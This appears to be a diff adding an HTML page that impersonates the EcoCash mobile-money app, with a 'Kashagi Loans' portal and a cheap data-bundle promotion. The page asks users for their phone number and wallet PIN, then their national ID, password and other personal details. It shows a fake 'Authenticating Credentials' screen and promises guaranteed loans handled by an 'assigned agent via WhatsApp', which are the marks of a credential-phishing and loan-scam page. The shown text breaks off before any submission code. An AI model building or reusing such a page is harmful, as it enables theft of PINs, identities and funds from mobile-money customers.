@@ -1,0 +1,1701 @@
+<!DOCTYPE html>
+<html lang="en" class="">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Super App - Kashagi Loans & Data Bundles</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        ecoblue: '#0066cc',
+                        ecodarkblue: '#004aa8',
+                        ecored: '#e61c24',
+                        cardblue: '#3b5998',
+                        supergreen: '#008751',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .curved-bottom {
+            border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px;
+        }
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+        @keyframes pulse-ring {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.8; }
+        }
+        .processing-pulse {
+            animation: pulse-ring 1.5s infinite ease-in-out;
+        }
+        @keyframes float-banner {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-3px); }
+            100% { transform: translateY(0px); }
+        }
+        .banner-float {
+            animation: float-banner 4s ease-in-out infinite;
+        }
+        /* Loading Skeleton Animation */
+        @keyframes shimmer {
+            0% { background-position: -200px 0; }
+            100% { background-position: calc(200px + 100%) 0; }
+        }
+        .skeleton {
+            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+            background-size: 200px 100%;
+            animation: shimmer 1.5s infinite;
+        }
+        .dark .skeleton {
+            background: linear-gradient(90deg, #2d3748 25%, #4a5568 50%, #2d3748 75%);
+            background-size: 200px 100%;
+        }
+        /* Reference-Matched Circular Service Icon Gradient */
+        .service-circle-icon {
+            background: radial-gradient(circle at 30% 30%, #4a90e2 0%, #005bb5 65%, #003d82 100%);
+            box-shadow: 0 6px 14px rgba(0, 91, 181, 0.28), inset 0 2px 4px rgba(255, 255, 255, 0.35);
+        }
+        .dark .service-circle-icon {
+            background: radial-gradient(circle at 30% 30%, #3b82f6 0%, #1d4ed8 65%, #1e3a8a 100%);
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.4), inset 0 1px 3px rgba(255, 255, 255, 0.25);
+        }
+    </style>
+</head>
+<body class="bg-gray-100 dark:bg-gray-900 font-sans antialiased text-gray-800 dark:text-gray-100 flex justify-center min-h-screen transition-colors duration-300">
+
+    <!-- Mobile Frame / Container -->
+    <div class="w-full max-w-md bg-white dark:bg-gray-800 min-h-screen flex flex-col shadow-2xl relative overflow-x-hidden transition-colors duration-300">
+
+        <!-- GLOBAL DIM LIGHT / 5-SECOND LOADING OVERLAY -->
+        <div id="global-dim-overlay" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-[2px] hidden flex flex-col items-center justify-center text-center transition-opacity duration-300">
+            <div class="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-2xl border border-gray-100 dark:border-gray-700 max-w-xs w-full space-y-6 mx-4">
+                <div class="relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse">
+                    <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
+                    <i class="fa-solid fa-shield-halved text-ecoblue text-2xl"></i>
+                </div>
+
+                <div class="space-y-2">
+                    <h3 id="overlay-title" class="font-extrabold text-base text-gray-800 dark:text-gray-100">Authenticating Credentials</h3>
+                    <p id="overlay-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Verifying secure session & wallet security...</p>
+                </div>
+
+                <div class="space-y-2 pt-1">
+                    <div class="h-3 w-full skeleton rounded"></div>
+                    <div class="h-3 w-3/4 skeleton rounded"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- HEADER & NAVIGATION -->
+        <header class="bg-white dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700 sticky top-0 z-40 transition-colors duration-300">
+            <div id="top-nav-bar" class="bg-ecoblue text-white text-xs py-2 px-4 flex justify-between items-center font-medium">
+                <div class="flex items-center space-x-2 bg-white text-ecoblue px-2 py-1 rounded shadow-sm">
+                    <img src="https://play-lh.googleusercontent.com/p8KM6TJr6mODf24U8AhPlX1uofQp5dATtVOdQxUoPHEgrWCvucuEb89Q5L8An36PBSb2iaoXn2i1H1QcPwFtyA" alt="EcoCash" class="w-4 h-4 object-contain rounded-full">
+                    <span class="font-extrabold tracking-tighter text-xs">EcoCash <span class="text-ecored">Super App</span></span>
+                </div>
+                <div class="flex items-center space-x-3">
+                    <button onclick="switchTabWithDim('contact')" class="hover:underline transition">Help Center</button>
+                    <button onclick="toggleDarkMode()" class="p-1.5 rounded-full bg-white/20 hover:bg-white/30 transition text-white" title="Toggle Dark Mode">
+                        <i id="dark-mode-icon" class="fa-solid fa-moon text-xs"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="px-4 py-3 flex justify-between items-center bg-white dark:bg-gray-800 transition-colors duration-300">
+                <div class="cursor-pointer flex items-center space-x-2" onclick="switchTabWithDim('login')">
+                    <span class="text-3xl font-extrabold text-ecoblue tracking-tight">Eco</span><span class="text-3xl font-extrabold text-ecored tracking-tight">Cash</span>
+                </div>
+
+                <button id="menu-btn" onclick="toggleMenu()" class="p-2 border border-gray-200 dark:border-gray-700 rounded-md text-gray-600 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700 focus:outline-none transition">
+                    <i class="fa-solid fa-bars text-xl"></i>
+                </button>
+            </div>
+
+            <!-- STEP-BY-STEP JOURNEY PROGRESS BAR (Visible during active application steps) -->
+            <div id="step-progress-bar" class="hidden bg-gray-50 dark:bg-gray-900/60 border-t border-gray-100 dark:border-gray-700 px-4 py-2">
+                <div class="flex items-center justify-between text-[10px] font-bold text-gray-500 dark:text-gray-400">
+                    <div id="step-ind-1" class="flex items-center space-x-1 text-ecoblue">
+                        <span class="w-4 h-4 rounded-full bg-ecoblue text-white flex items-center justify-center text-[9px]">1</span>
+                        <span>Service</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-gray-200 dark:bg-gray-700 mx-1.5">
+                        <div id="step-line-1" class="h-full bg-ecoblue w-0 transition-all duration-300"></div>
+                    </div>
+                    <div id="step-ind-2" class="flex items-center space-x-1">
+                        <span class="w-4 h-4 rounded-full bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300 flex items-center justify-center text-[9px]">2</span>
+                        <span>Details</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-gray-200 dark:bg-gray-700 mx-1.5">
+                        <div id="step-line-2" class="h-full bg-ecoblue w-0 transition-all duration-300"></div>
+                    </div>
+                    <div id="step-ind-3" class="flex items-center space-x-1">
+                        <span class="w-4 h-4 rounded-full bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300 flex items-center justify-center text-[9px]">3</span>
+                        <span>Tier</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-gray-200 dark:bg-gray-700 mx-1.5">
+                        <div id="step-line-3" class="h-full bg-ecoblue w-0 transition-all duration-300"></div>
+                    </div>
+                    <div id="step-ind-4" class="flex items-center space-x-1">
+                        <span class="w-4 h-4 rounded-full bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300 flex items-center justify-center text-[9px]">4</span>
+                        <span>Confirm</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="nav-dropdown" class="hidden bg-white dark:bg-gray-800 border-t border-gray-100 dark:border-gray-700 px-6 py-3 space-y-3 shadow-md transition-colors duration-300">
+                <div>
+                    <button onclick="switchTabWithDim('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Log In</button>
+                </div>
+                <div>
+                    <button onclick="switchTabWithDim('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Sign Up</button>
+                </div>
+                <div>
+                    <button onclick="switchTabWithDim('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Dedicated Help Center (FAQs)</button>
+                </div>
+            </div>
+        </header>
+
+        <!-- MAIN CONTENT CONTAINER -->
+        <main class="flex-1 flex flex-col justify-between">
+
+            <!-- Toast Notification Container -->
+            <div id="toast-container" class="fixed top-24 left-1/2 -translate-x-1/2 z-50 transition-all duration-300 opacity-0 pointer-events-none">
+                <div id="toast-message" class="bg-red-600 text-white px-4 py-2 rounded-lg shadow-lg text-xs font-semibold tracking-wide text-center">
+                    Please fill in all fields before proceeding.
+                </div>
+            </div>
+
+            <!-- ================= VIEW 1: LOGIN SCREEN ================= -->
+            <section id="view-login" class="flex-1 flex flex-col justify-between">
+                <div class="p-6">
+                    <div class="text-center mb-6">
+                        <span class="inline-block bg-blue-50 dark:bg-gray-700 text-ecoblue dark:text-blue-300 text-[10px] font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-1">Step 1 of 4 • Wallet Verification</span>
+                        <h2 class="text-xl font-bold text-gray-800 dark:text-gray-100">Login to EcoCash</h2>
+                    </div>
+
+                    <!-- Phone Input -->
+                    <div class="mb-4">
+                        <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Phone Number <span class="text-red-500">*</span></label>
+                        <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue dark:bg-gray-700 dark:border-gray-600 relative">
+                            <div class="flex items-center space-x-2 mr-2 border-r border-gray-300 dark:border-gray-600 pr-2">
+                                <span class="text-lg">🇿🇼</span>
+                                <span class="text-gray-700 dark:text-gray-200 font-semibold text-sm">+263</span>
+                            </div>
+                            <input type="tel" id="login-phone" inputmode="numeric" pattern="[0-9]*" placeholder="712345678" maxlength="9" class="w-full text-gray-800 dark:text-gray-100 bg-transparent font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
+                            <span id="login-phone-icon" class="absolute right-3 hidden text-base"></span>
+                        </div>
+                        <p id="login-phone-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Incorrect phone number (Must be 9 digits starting with 7)</p>
+                    </div>
+
+                    <!-- Single Smooth PIN Input Field (Seamless Typing) -->
+                    <div class="text-center mb-6">
+                        <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-2">Enter your 4-Digit PIN <span class="text-red-500">*</span></label>
+                        <div class="relative max-w-xs mx-auto">
+                            <input type="password" id="login-pin-single" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="••••" class="w-full h-14 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-xl text-center text-2xl font-extrabold tracking-[1em] focus:outline-none focus:ring-2 focus:ring-ecoblue shadow-sm" oninput="validateLoginForm()">
+                            
+                            <button type="button" onclick="togglePinVisibility()" class="absolute right-4 top-4 text-gray-600 dark:text-gray-300 hover:text-ecoblue focus:outline-none">
+                                <i id="pin-eye-icon" class="fa-regular fa-eye text-lg"></i>
+                            </button>
+                        </div>
+                        <p id="login-pin-error" class="text-[11px] text-red-600 mt-1 hidden font-medium text-center">Incorrect PIN (Must be exactly 4 digits)</p>
+                    </div>
+
+                    <!-- LOGIN BUTTON -->
+                    <button id="login-btn" disabled onclick="handleLoginSubmit()" class="w-full py-3 px-4 rounded-lg bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm">
+                        LOGIN & CONTINUE
+                    </button>
+                </div>
+
+                <!-- Bottom Curved Blue Action Box -->
+                <div class="bg-ecoblue text-white curved-bottom pt-8 pb-10 px-6 text-center space-y-5">
+                    <p class="text-sm font-medium leading-relaxed px-4">
+                        To register an EcoCash wallet or get assistance, click below
+                    </p>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <button onclick="switchTabWithDim('signup')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                            <i class="fa-solid fa-user text-gray-700 text-lg"></i>
+                            <span class="font-bold text-sm">Register</span>
+                        </button>
+
+                        <button onclick="switchTabWithDim('contact')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                            <i class="fa-solid fa-circle-info text-gray-500 text-lg"></i>
+                            <span class="font-bold text-sm">Help & Support</span>
+                        </button>
+                    </div>
+
+                    <div class="pt-4 text-xs space-y-1 opacity-90">
+                        <p class="font-medium">v2.1.3P</p>
+                        <p class="text-xs">By signing in you agree to the <a href="#" class="underline font-semibold">Terms and Conditions</a></p>
+                    </div>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 2: SIGN UP SCREEN ================= -->
+            <section id="view-signup" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800">
+                <div class="bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border border-gray-100 dark:border-gray-700 mb-6 transition-colors">
+                    <div class="flex items-center justify-between mb-4">
+                        <button onclick="switchTabWithDim('login')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back to Login</span>
+                        </button>
+                        <h2 class="text-xl font-bold text-gray-800 dark:text-gray-100">Sign up</h2>
+                    </div>
+
+                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700 dark:text-gray-300">
+                        <!-- First Name -->
+                        <div>
+                            <label class="block font-medium mb-1">First Name <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="signup-firstname" placeholder="First Name" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-firstname-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-firstname-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect First Name (Letters only)</p>
+                        </div>
+
+                        <!-- Surname -->
+                        <div>
+                            <label class="block font-medium mb-1">Surname <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="signup-surname" placeholder="Surname" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-surname-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-surname-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Surname (Letters only)</p>
+                        </div>
+
+                        <!-- Country Select with Flags -->
+                        <div>
+                            <label class="block font-medium mb-1">Country & Region <span class="text-red-500">*</span></label>
+                            <select id="signup-country" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none bg-white focus:border-ecoblue text-gray-600 dark:text-gray-300" onchange="validateSignupForm()">
+                                <option value="">--- Select Country ---</option>
+                                <option value="Zimbabwe">🇿🇼 Zimbabwe (+263)</option>
+                                <option value="Kenya">🇰🇪 Kenya (+254)</option>
+                                <option value="South Africa">🇿🇦 South Africa (+27)</option>
+                                <option value="Nigeria">🇳🇬 Nigeria (+234)</option>
+                                <option value="Botswana">🇧🇼 Botswana (+267)</option>
+                                <option value="Zambia">🇿🇲 Zambia (+260)</option>
+                                <option value="Malawi">🇲🇼 Malawi (+265)</option>
+                                <option value="Mozambique">🇲🇿 Mozambique (+258)</option>
+                                <option value="Tanzania">🇹🇿 Tanzania (+255)</option>
+                                <option value="Uganda">🇺🇬 Uganda (+256)</option>
+                                <option value="Ghana">🇬🇭 Ghana (+233)</option>
+                                <option value="United Kingdom">🇬🇧 United Kingdom (+44)</option>
+                                <option value="United States">🇺🇸 United States (+1)</option>
+                                <option value="Canada">🇨🇦 Canada (+1)</option>
+                                <option value="Australia">🇦🇺 Australia (+61)</option>
+                                <option value="Other">🌍 Other International Region</option>
+                            </select>
+                        </div>
+
+                        <!-- Username (Mobile Number) -->
+                        <div>
+                            <label class="block font-medium mb-1">Username (Mobile number) <span class="text-red-500">*</span></label>
+                            <div class="bg-gray-100 dark:bg-gray-700 text-gray-500 dark:text-gray-300 p-2.5 rounded-md text-center text-sm font-semibold mb-2 border border-gray-200 dark:border-gray-600">
+                                +263 (Default EcoCash Region)
+                            </div>
+                            <div class="relative">
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="signup-phone" placeholder="Mobile Number (e.g. 712345678)" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Mobile Number (Must be 9 digits starting with 7)</p>
+                        </div>
+
+                        <!-- Email -->
+                        <div>
+                            <label class="block font-medium mb-1">Email <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="email" id="signup-email" placeholder="Email Address" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-email-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-email-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Email format</p>
+                        </div>
+
+                        <!-- National ID -->
+                        <div>
+                            <label class="block font-medium mb-1">Zimbabwe National Id / Regional ID <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="signup-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateSignupForm()">
+                                <span id="signup-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Incorrect ID format (e.g., 63-1234567A89)</p>
+                        </div>
+
+                        <!-- Password -->
+                        <div>
+                            <label class="block font-medium mb-1">
+                                New Password <span class="text-red-500">*</span> <span class="font-normal text-gray-500 dark:text-gray-400">(Min 8 chars, 1 letter, 1 number)</span>
+                            </label>
+                            <div class="relative">
+                                <input type="password" id="new-password" placeholder="New Password" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 pr-16 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-password-icon" class="absolute right-9 top-2.5 hidden text-sm"></span>
+                                <button type="button" onclick="togglePasswordVisibility()" class="absolute right-2.5 top-3 text-gray-500">
+                                    <i id="password-eye-icon" class="fa-regular fa-eye"></i>
+                                </button>
+                            </div>
+                            <p id="signup-password-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Password (Min 8 chars, 1 letter & 1 number)</p>
+                        </div>
+
+                        <!-- Gender -->
+                        <div>
+                            <label class="block font-medium mb-1">Gender <span class="text-red-500">*</span></label>
+                            <div class="flex items-center space-x-4">
+                                <label class="inline-flex items-center space-x-1 cursor-pointer">
+                                    <input type="radio" name="gender" value="Male" class="text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                                    <span>Male</span>
+                                </label>
+                                <label class="inline-flex items-center space-x-1 cursor-pointer">
+                                    <input type="radio" name="gender" value="Female" class="text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                                    <span>Female</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Birthday -->
+                        <div>
+                            <label class="block font-medium mb-1">Birthday <span class="text-red-500">*</span></label>
+                            <div class="grid grid-cols-3 gap-2">
+                                <select id="b-day" class="border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-xs text-gray-600 dark:text-gray-300 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Day</option>
+                                    <script>
+                                        for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                                    </script>
+                                </select>
+                                <select id="b-month" class="border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-xs text-gray-600 dark:text-gray-300 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Month</option>
+                                    <option value="January">January</option><option value="February">February</option><option value="March">March</option>
+                                    <option value="April">April</option><option value="May">May</option><option value="June">June</option>
+                                    <option value="July">July</option><option value="August">August</option><option value="September">September</option>
+                                    <option value="October">October</option><option value="November">November</option><option value="December">December</option>
+                                </select>
+                                <select id="b-year" class="border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-xs text-gray-600 dark:text-gray-300 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Year</option>
+                                    <script>
+                                        for(let i=2008; i>=1940; i--) document.write(`<option value="${i}">${i}</option>`);
+                                    </script>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- Terms Checkbox -->
+                        <div class="flex items-start space-x-2 pt-2">
+                            <input type="checkbox" id="terms" class="mt-0.5 rounded text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                            <label for="terms" class="text-xs text-gray-600 dark:text-gray-400 leading-tight cursor-pointer">
+                                By clicking Sign Up, you agree to our <a href="#" class="text-blue-500 hover:underline">Terms, Data Policy and Cookie Policy</a>.
+                            </label>
+                        </div>
+
+                        <!-- Submit Buttons -->
+                        <div class="pt-4 space-y-3">
+                            <button type="button" id="signup-btn" disabled onclick="handleSignUpSubmit()" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition">
+                                SIGN UP
+                            </button>
+                            <button type="button" onclick="switchTabWithDim('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 dark:hover:bg-gray-700 transition">
+                                LOGIN
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="text-center py-4 text-xs font-semibold text-gray-600 dark:text-gray-400">
+                    ©2026 Ecocash
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 3: KASHAGI LOANS PORTAL & CIRCULAR SERVICES GRID ================= -->
+            <section id="view-kashagi-hub" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
+                <div>
+                    <!-- Client Profile Banner with Smart Card Graphic -->
+                    <div class="bg-gradient-to-r from-cardblue to-ecodarkblue rounded-xl p-4 shadow-md text-white mb-5 relative overflow-hidden">
+                        <div class="absolute right-[-10px] bottom-[-10px] opacity-20 text-6xl">
+                            <i class="fa-solid fa-credit-card"></i>
+                        </div>
+                        <div class="flex items-center justify-between">
+                            <div>
+                                <span class="text-[10px] uppercase font-bold text-blue-200 tracking-wider">Smart EcoCash ID Card</span>
+                                <h3 id="profile-name-display" class="font-extrabold text-sm mt-0.5">---</h3>
+                                <p id="profile-id-display" class="text-xs text-blue-100 font-mono mt-1">ID: ---</p>
+                                <p id="profile-phone-display" class="text-[11px] text-blue-200 mt-0.5">Phone: ---</p>
+                            </div>
+                            <img src="https://play-lh.googleusercontent.com/p8KM6TJr6mODf24U8AhPlX1uofQp5dATtVOdQxUoPHEgrWCvucuEb89Q5L8An36PBSb2iaoXn2i1H1QcPwFtyA" alt="Card Logo" class="w-10 h-10 object-contain rounded-lg bg-white p-1 shadow">
+                        </div>
+                    </div>
+
+                    <!-- REFERENCE-MATCHED 4-COLUMN CIRCULAR BLUE GRADIENT SERVICES GRID -->
+                    <div class="bg-white dark:bg-gray-800 rounded-2xl p-4 shadow-sm border border-gray-100 dark:border-gray-700 mb-5">
+                        <div class="flex items-center justify-between mb-3.5 px-1">
+                            <h3 class="text-xs font-extrabold uppercase tracking-wider text-gray-700 dark:text-gray-200">EcoCash Services</h3>
+                            <span class="text-[10px] font-semibold text-ecoblue dark:text-blue-400">Select Action</span>
+                        </div>
+
+                        <div class="grid grid-cols-4 gap-2 text-center">
+                            <!-- Service 1: Boost Loan -->
+                            <button onclick="switchTabWithDim('boost-form')" class="flex flex-col items-center group focus:outline-none">
+                                <div class="w-14 h-14 rounded-full service-circle-icon flex items-center justify-center text-white mb-2 transform group-hover:scale-105 group-active:scale-95 transition duration-200">
+                                    <i class="fa-solid fa-circle-dollar-to-slot text-xl"></i>
+                                </div>
+                                <span class="text-[11px] font-semibold text-gray-700 dark:text-gray-200 leading-tight group-hover:text-ecoblue">Boost<br>Loan</span>
+                            </button>
+
+                            <!-- Service 2: Airtime & Bundles -->
+                            <button onclick="buyBundlePromo('28GB for $10 USD (30 Days)')" class="flex flex-col items-center group focus:outline-none">
+                                <div class="w-14 h-14 rounded-full service-circle-icon flex items-center justify-center text-white mb-2 transform group-hover:scale-105 group-active:scale-95 transition duration-200">
+                                    <i class="fa-solid fa-mobile-screen-button text-xl"></i>
+                                </div>
+                                <span class="text-[11px] font-semibold text-gray-700 dark:text-gray-200 leading-tight group-hover:text-ecoblue">Airtime &<br>Bundles</span>
+                            </button>
+
+                            <!-- Service 3: Kashagi Loans -->
+                            <button onclick="switchTabWithDim('apply-form')" class="flex flex-col items-center group focus:outline-none">
+                                <div class="w-14 h-14 rounded-full service-circle-icon flex items-center justify-center text-white mb-2 transform group-hover:scale-105 group-active:scale-95 transition duration-200">
+                                    <i class="fa-solid fa-landmark text-xl"></i>
+                                </div>
+                                <span class="text-[11px] font-semibold text-gray-700 dark:text-gray-200 leading-tight group-hover:text-ecoblue">Kashagi<br>Loans</span>
+                            </button>
+
+                            <!-- Service 4: Support & FAQs -->
+                            <button onclick="switchTabWithDim('contact')" class="flex flex-col items-center group focus:outline-none">
+                                <div class="w-14 h-14 rounded-full service-circle-icon flex items-center justify-center text-white mb-2 transform group-hover:scale-105 group-active:scale-95 transition duration-200">
+                                    <i class="fa-solid fa-file-invoice-dollar text-xl"></i>
+                                </div>
+                                <span class="text-[11px] font-semibold text-gray-700 dark:text-gray-200 leading-tight group-hover:text-ecoblue">Support &<br>FAQs</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- STEP-BY-STEP GUIDE CARD -->
+                    <div class="bg-white dark:bg-gray-800 rounded-xl p-4 shadow-sm border border-gray-100 dark:border-gray-700 mb-4">
+                        <div class="flex items-center justify-between mb-2.5">
+                            <span class="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200 text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase tracking-wider">Guaranteed • No Guarantor</span>
+                            <span class="text-[10px] text-gray-400 font-semibold">4 Simple Steps</span>
+                        </div>
+                        <h3 class="text-sm font-extrabold text-gray-800 dark:text-gray-100 mb-3">How Kashagi Loan Approval Works</h3>
+                        
+                        <div class="space-y-2.5 text-xs">
+                            <div class="flex items-start space-x-2.5">
+                                <span class="w-5 h-5 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue font-bold flex items-center justify-center text-[10px] flex-shrink-0 mt-0.5">1</span>
+                                <p class="text-gray-600 dark:text-gray-300"><strong class="text-gray-800 dark:text-gray-100">Choose Service:</strong> Tap <span class="text-ecoblue font-semibold">Boost Loan</span> or <span class="text-ecoblue font-semibold">Kashagi Loans</span> above.</p>
+                            </div>
+                            <div class="flex items-start space-x-2.5">
+                                <span class="w-5 h-5 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue font-bold flex items-center justify-center text-[10px] flex-shrink-0 mt-0.5">2</span>
+                                <p class="text-gray-600 dark:text-gray-300"><strong class="text-gray-800 dark:text-gray-100">Verify Credentials:</strong> Enter your full names & National ID for 6-month history check.</p>
+                            </div>
+                            <div class="flex items-start space-x-2.5">
+                                <span class="w-5 h-5 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue font-bold flex items-center justify-center text-[10px] flex-shrink-0 mt-0.5">3</span>
+                                <p class="text-gray-600 dark:text-gray-300"><strong class="text-gray-800 dark:text-gray-100">Select Loan Tier:</strong> Choose your desired credit limit ($100 – $3,000 USD).</p>
+                            </div>
+                            <div class="flex items-start space-x-2.5">
+                                <span class="w-5 h-5 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue font-bold flex items-center justify-center text-[10px] flex-shrink-0 mt-0.5">4</span>
+                                <p class="text-gray-600 dark:text-gray-300"><strong class="text-gray-800 dark:text-gray-100">Confirm & Disburse:</strong> Accept terms and submit directly to your assigned agent via WhatsApp.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- PROMOTIONAL BANNER: 28GB for $10 USD -->
+                    <div class="mb-2 bg-gradient-to-r from-ecodarkblue via-blue-600 to-indigo-600 rounded-xl p-4 text-white shadow-lg relative overflow-hidden banner-float border border-blue-400/30">
+                        <div class="absolute right-[-20px] bottom-[-20px] opacity-15 text-8xl pointer-events-none">
+                            <i class="fa-solid fa-wifi"></i>
+                        </div>
+                        <div class="flex items-center justify-between mb-2">
